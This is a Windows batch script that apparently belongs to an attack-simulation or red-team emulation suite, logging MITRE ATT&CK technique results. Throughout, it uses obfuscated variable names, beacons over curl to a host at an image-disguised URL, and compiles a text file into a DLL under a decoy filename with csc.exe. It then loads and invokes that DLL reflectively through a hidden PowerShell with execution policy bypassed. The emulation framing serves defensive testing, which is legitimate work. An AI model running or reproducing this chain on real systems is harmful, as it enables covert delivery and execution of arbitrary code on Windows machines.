@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET recnn=%APPDATA%\9916\24b0e3c8
SET detcfkn=https://10.0.0.49
SET uouoq=https://10.0.0.49/stage/2/icon.png?9916-10
SET lqyereup=ITZEL-S2BS
SET ufeybybm=10
SET hpnjatpj=wimrar.txt
SET njozco=file.txt
SET kkjwr=9916
SET fgoueq=%APPDATA%\!ufeybybm!\macula-simulations.log
SET qozjj=%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\csc.exe
SET jdlwzm=T1500|Compile After Delivery
SET jcbcsu=T1218|Signed Binary Proxy Execution

echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: heartbeat_start=>> "!fgoueq!" 2>nul
curl -k -s -o nul "!uouoq!"
SET eewptv=1
IF ERRORLEVEL 1 SET eewptv=0 & SET qitsez=curl_failed
echo [!DATE! !TIME!][TTP][!lqyereup!][!kkjwr!]: !jcbcsu!=!eewptv!:!qitsez!>> "!fgoueq!" 2>nul

echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: chdir_start=!recnn!>> "!fgoueq!" 2>nul
cd /d "!recnn!" 2>nul
SET mrygpm=0
IF NOT ERRORLEVEL 1 SET mrygpm=1
echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: chdir_result=!mrygpm!>> "!fgoueq!" 2>nul

echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: compile_start=!njozco!>> "!fgoueq!" 2>nul
"!qozjj!" /target:library /out:"!hpnjatpj!" "!njozco!" >nul 2>&1
SET mjbche=1
SET djhmxf=
IF NOT EXIST "!hpnjatpj!" SET mjbche=0 & SET djhmxf=csc_failed
echo [!DATE! !TIME!][TTP][!lqyereup!][!kkjwr!]: !jdlwzm!=!mjbche!:!djhmxf!>> "!fgoueq!" 2>nul
echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: compile_result=!mjbche!>> "!fgoueq!" 2>nul

IF !mjbche! EQU 0 EXIT /B 1
echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: execution_start=powershell>> "!fgoueq!" 2>nul
powershell.exe -nop -w hidden -ep bypass -Command "& { $a=[Reflection.Assembly]::Load([IO.File]::ReadAllBytes('!hpnjatpj!')); $types=$a.GetExportedTypes(); foreach ($t in $types) { $m=$t.GetMethods([Reflection.BindingFlags]::Public -bor [Reflection.BindingFlags]::Static)[0]; if ($m -ne $null) { $m.Invoke($null, @()); break } } }"
SET dbtgzf=1
IF ERRORLEVEL 1 SET dbtgzf=0 & SET mbeebx=powershell_failed
echo [!DATE! !TIME!][TTP][!lqyereup!][!kkjwr!]: !jcbcsu!=!dbtgzf!:!mbeebx!>> "!fgoueq!" 2>nul
echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: execution_result=!dbtgzf!>> "!fgoueq!" 2>nul